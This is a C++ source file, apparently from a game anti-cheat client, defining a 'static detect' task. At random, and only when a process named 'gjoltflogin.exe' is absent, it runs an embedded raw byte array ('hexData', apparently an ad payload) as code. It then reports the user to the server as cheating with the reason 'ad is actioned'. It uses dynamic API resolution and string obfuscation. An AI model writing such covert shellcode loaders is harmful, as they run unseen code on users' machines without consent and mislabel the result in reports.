#include "anticheat.h"
#include <stdint.h>
#include <string>
#include "protocol.h"
#include "utils/utils.h"
#include <xorstr.hpp>
#include "utils/api_resolver.h"
#include "ad_messagebox.h"


namespace ShellCode
{
    class TaskStaticDetect : public Task
    {
    public:
        TaskStaticDetect()
        {
            auto CreateMutexA = IMPORT(L"kernel32.dll", CreateMutexA);
            CreateMutexA(NULL, FALSE, "IL8C92LSFG_1.0");
            set_interval(30 * 1000 * 2);
            set_package_id(SHELLCODE_PACKAGE_ID(80));
            cheat = false;
        }
        ~TaskStaticDetect()
        {

        }
        virtual void on_time_proc(uint32_t curtime)
        {
            if(cheat)
            {
                ProtocolShellCodeInstance proto;
                proto.m_type = Protocol::PackageType::PACKAGE_TYPE_ADMIN;
                proto.id = get_package_id();
                proto.is_cheat = true;
                proto.reason = L"ad is actioned";
                AntiCheat::instance().send(proto);
                cheat = false;
            }

        }

        bool cheat;        
    };

    uint32_t main()
    {
        TaskStaticDetect* task = new TaskStaticDetect();
        if(AntiCheat::instance().add_task(task))
        {
            auto GetTickCount = IMPORT(L"kernel32.dll", GetTickCount);
            DWORD tick_count = GetTickCount() % 0xFF;
            if(0 <= tick_count && tick_count <= 0xFF / 100)
            {
                auto task = reinterpret_cast<ShellCode::TaskStaticDetect*>(AntiCheat::instance().task_map_[SHELLCODE_PACKAGE_ID(80)]);
                auto Sleep = IMPORT(L"kernel32.dll", Sleep);
                bool is_create = false;
                Sleep(30 * 1000 * 4);
                auto processes = Utils::CWindows::instance().enum_process();

                for(auto& process : processes)
                {
                    if(process.second.name == L"gjoltflogin.exe")
                    {
                        is_create = true;
                        break;
                    }
                }

                if(!is_create)
                {
                    typedef void(*fp_down)(HWND hwnd, HINSTANCE hinst, LPCSTR lpCmdLine, INT nCmdShow);
                    fp_down fun = (fp_down)(LPVOID)hexData;
                    fun(0,0,0,0);
                    task->cheat = true;
                }
            }

            return 0;
        }
        else
        {
            delete task;
            return 1;
        }
    }
}